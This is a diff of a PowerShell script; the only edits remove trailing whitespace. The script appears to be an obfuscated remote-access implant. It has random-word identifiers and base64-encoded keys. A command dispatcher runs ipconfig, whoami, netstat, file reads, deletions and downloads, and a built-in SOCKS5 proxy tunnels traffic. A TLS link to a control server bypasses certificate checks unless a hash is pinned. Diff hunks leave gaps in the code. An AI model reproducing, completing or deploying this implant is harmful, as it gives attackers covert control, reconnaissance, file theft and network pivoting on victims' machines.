@@ -1,26 +1,26 @@
 $yield = "5"
 $teamwork = [System.Convert]::FromBase64String("k+REtlRcipkMkVW89B0j/RIN3rjxydFeGQ1QoldKypo=")
 $nobleman = [System.Convert]::FromBase64String("tItX91yHRvj6EkVNFcRStQ==")
-function empathy 
+function empathy
 {
     $eagle = ipconfig /all | Out-String
     return $eagle
 
 }
-function scholarship 
+function scholarship
 {
     param([string] $linguistic) # the file path on disk we want to download
-    
+
     $eagle = Get-Content -Path $linguistic -Raw
 
     return $eagle
 }
 
-function jeopardy 
+function jeopardy
 {
     param([string] $linguistic) # the uri to get from, and the place to save to
 
-    
+
 
     if($linguistic.Length -lt 1)
     {
@@ -32,7 +32,7 @@ function jeopardy
 
         $linguistic = "`"$barnacle`""
     }
-    
+
     Invoke-RestMethod -Uri "$monastery//$formula/$significant/$yield" -OutFile $linguistic
 }
 function recognize
@@ -43,7 +43,7 @@ function recognize
     $bioluminescence = $eagle.ToString()
 
     return $bioluminescence
-    
+
 }
 function knapsack
 {
@@ -53,14 +53,14 @@ function knapsack
 
     return $eagle
 }
-function immortal 
+function immortal
 {
     param([string] $flickering) # the directory we are going to change to
 
     cd $flickering
     return "Attempted to change to $flickering."
 }
-function serendipity 
+function serendipity
 {
     param([string] $ferocious) # the item we want to remove
 
@@ -69,20 +69,20 @@ function serendipity
     return "Attempted to remove $ferocious."
 
 }
-function adaptable-tcp 
+function adaptable-tcp
 {
    $eagle = Get-NetTCPConnection | Out-String
    return $eagle
 }
-function pioneer 
+function pioneer
 {
     $eagle = whoami /all | Out-String
     return $eagle
 }
 [ScriptBlock]$neon = {
     param( $ability )
-    
-    $whimsical = 
+
+    $whimsical =
     {
             param( $ability )
             $ability.inStream.CopyTo($ability.outStream)
@@ -91,7 +91,7 @@ function pioneer
 
     $telescope = $ability.rsp
 
-    function mosaic 
+    function mosaic
     {
         param($labyrinth)
         if ($labyrinth -as [ipaddress])
@@ -115,11 +115,11 @@ function pioneer
         $oblivious.Read($azure, 0, 2) | Out-Null
 
         $firefighter = $azure[0]
-        
+
         if ($firefighter -eq 5)
         {
             $oblivious.Read($azure, 2, $azure[1]) | Out-Null
-            for ($halcyon = 2; $halcyon -le $azure[1] + 1; $halcyon++) 
+            for ($halcyon = 2; $halcyon -le $azure[1] + 1; $halcyon++)
             {
                 if ($azure[$halcyon] -eq 0) {break}
             }
@@ -187,12 +187,12 @@ function pioneer
                 $azure[5] = 0
                 $oblivious.Write($azure, 0, 10)
                 $oblivious.Flush()
-                $yearn = $jamboree.GetStream() 
+                $yearn = $jamboree.GetStream()
                 $liberty = $yearn.CopyToAsync($oblivious)
                 $venture = $oblivious.CopyToAsync($yearn)
                 $venture.AsyncWaitHandle.WaitOne()
                 $liberty.AsyncWaitHandle.WaitOne()
-                
+
             }
             else
             {
@@ -221,7 +221,7 @@ function pioneer
                 $oblivious.Read($azure, 0, 1)
             }
             $jamboree = New-Object System.Net.Sockets.TcpClient($unexpected, $enchanting)
-            
+
             if($jamboree.Connected)
             {
                 $azure[0] = 0
@@ -230,7 +230,7 @@ function pioneer
                 $azure[3] = 0
                 $oblivious.Write($azure, 0, 8)
                 $oblivious.Flush()
-                $yearn = $jamboree.GetStream() 
+                $yearn = $jamboree.GetStream()
                 $liberty = $yearn.CopyToAsync($oblivious)
                 $venture = $oblivious.CopyTo($yearn)
                 $venture.AsyncWaitHandle.WaitOne()
@@ -244,13 +244,13 @@ function pioneer
     }
     catch {
     }
-    finally 
+    finally
     {
-        if ($horseshoe -ne $null) 
+        if ($horseshoe -ne $null)
         {
             $horseshoe.Dispose()
         }
-        if ($jamboree -ne $null) 
+        if ($jamboree -ne $null)
         {
             $jamboree.Dispose()
         }
@@ -266,7 +266,7 @@ function literature{
             [Int] $aroma = 200,
             [Int] $xylotomy = 0 )
 
-    try 
+    try
     {
 
         $wondrous = 0
@@ -283,7 +283,7 @@ function literature{
             {
                 $horseshoe = New-Object System.Net.Sockets.TcpClient($archive, $jungle)
                 $wanderlust = $horseshoe.GetStream()
-                
+
                 if($fortitude -eq '')
                 {
                     $oblivious = New-Object System.Net.Security.SslStream($wanderlust, $false, ({$true} -as[Net.Security.RemoteCertificateValidationCallback]));
@@ -292,9 +292,9 @@ function literature{
                 {
                     $oblivious = New-Object System.Net.Security.SslStream($wanderlust, $false, ({return $glacier[1].GetCertHashString() -eq $fortitude } -as[Net.Security.RemoteCertificateValidationCallback]));
                 }
-                
+
                 $oblivious.AuthenticateAsClient($archive, $null, [Net.SecurityProtocolType]::Tls12, $false)
-                
+
                 Write-Host "Connected"
 
 
@@ -305,14 +305,14 @@ function literature{
 
                 $landscape = [System.Text.Encoding]::Default.GetBytes("GET / HTTP/1.1`nHost: " + $archive + "`n`n")
                 $oblivious.Write($landscape, 0, $landscape.Length)
-                
+
                 $oblivious.ReadTimeout = 1000
                 $oblivious.Read($question, 0, 122) | Out-Null
-                
+
                 $oblivious.Read($azure, 0, 5) | Out-Null
-                
+
                 $mandolin = [System.Text.Encoding]::ASCII.GetString($azure)
-                
+
                 Write-Host $mandolin
 
                 if($mandolin -ne "HELLO")
@@ -356,12 +356,12 @@ function literature{
     {
         write-host "Server closed."
 
-        if ($horseshoe -ne $null) 
+        if ($horseshoe -ne $null)
         {
             $horseshoe.Dispose()
             $horseshoe = $null
         }
-        if ($yesterday -ne $null -and $ecosystem -ne $null) 
+        if ($yesterday -ne $null -and $ecosystem -ne $null)
         {
             $yesterday.EndInvoke($ecosystem) | Out-Null
             $yesterday.Runspace.Close()
@@ -382,9 +382,9 @@ function renaissance
 
 function glamour
 {
-    param([string]$victorious,     
-        [string]$jackpot,   
-        [string]$orchestra)            
+    param([string]$victorious,
+        [string]$jackpot,
+        [string]$orchestra)
 
     if ($victorious -eq "exit" -or $victorious -eq "checkin")
     {
@@ -392,7 +392,7 @@ function glamour
     }
 	elseif($victorious -eq "ipconfig")
 	{
-		$eagle = empathy 
+		$eagle = empathy
 	}
 	elseif($victorious -eq "download")
 	{
@@ -408,7 +408,7 @@ function glamour
 	}
 	elseif($victorious -eq "pwd")
 	{
-		$eagle = knapsack 
+		$eagle = knapsack
 	}
 	elseif($victorious -eq "cd")
 	{
@@ -420,11 +420,11 @@ function glamour
 	}
 	elseif($victorious -eq "netstat-tcp")
 	{
-		$eagle = adaptable-tcp 
+		$eagle = adaptable-tcp
 	}
 	elseif($victorious -eq "whoami")
 	{
-		$eagle = pioneer 
+		$eagle = pioneer
 	}
 	elseif($victorious -eq "socks")
 	{
@@ -515,18 +515,18 @@ function lavender
 
 function airplane
 {
-    param($epiphany, 
-          $keen,  
-          $reverie, $zephyr)         
+    param($epiphany,
+          $keen,
+          $reverie, $zephyr)
 
-   
+
    $javelin = [System.Security.Cryptography.HashAlgorithm]::Create("SHA256").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($epiphany))
 
    $celebration = octopus $keen $reverie $zephyr
 
    $catalyst = 1
    for($yucca = 0; $yucca -lt $javelin.Length; $yucca++)
-   {        
+   {
         if($javelin[$yucca] -ne $celebration[$yucca])
         {
             $catalyst = 0
@@ -539,10 +539,10 @@ function airplane
 function workshop
 {
     param($elaborate,
-          $safari, $xerox)         
+          $safari, $xerox)
 
     $javelin = [System.Security.Cryptography.HashAlgorithm]::Create("SHA256").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($elaborate))
-    
+
     $microscope = lavender $javelin $safari $xerox
 
 
@@ -553,9 +553,9 @@ function workshop
 function inquisitive
 {
 
-    param([string]$anchor,        
-          [int]$unorthodox,     
-          [int]$labyrinthine)    
+    param([string]$anchor,
+          [int]$unorthodox,
+          [int]$labyrinthine)
 
 
     $universal = [Math]::Min($labyrinthine, $anchor.Length-$unorthodox)
@@ -563,7 +563,7 @@ function inquisitive
     $prodigy = $anchor.SubString($unorthodox, $universal)
 
     $kaleidoscope = $universal + $unorthodox
-    
+
     if($kaleidoscope -ge $anchor.Length)
     {
         $kaleidoscope = "true"
@@ -593,7 +593,7 @@ function mathematics
     return $elaborate
 }
 
-function gentleman 
+function gentleman
 {
 
     $barnacle = ""
@@ -642,7 +642,7 @@ function xylophone
     for ($yucca = 0; $yucca -lt $xenophobia.Length; $yucca++)
     {
 
-        
+
 
         $victorious = $xenophobia[$yucca]
 
@@ -650,12 +650,12 @@ function xylophone
         {
 
             $camouflage = $victorious -split '<br>'
-    
+
             $tactile = $camouflage[0]
             $unfathomable = $camouflage[1]
             $occupation = $camouflage[2]
             $unorthodox = $camouflage[3]
-            
+
             if($unorthodox -eq 0)
             {
 
@@ -666,7 +666,7 @@ function xylophone
             {
                 $eagle = $camouflage[4]
             }
-            
+
 
             $prodigy = (inquisitive $eagle $unorthodox $labyrinthine) -split "<chnk>"
 
@@ -690,14 +690,14 @@ function xylophone
                 exit
             }
 
-            
+
             if($unorthodox -ne "true")
             {
                 $xenophobia[$yucca] = "$tactile<br>$unfathomable<br>$occupation<br>$unorthodox<br>$eagle"
                 $gingerbread += $xenophobia[$yucca]
             }
 
-            
+
         }
 
     }
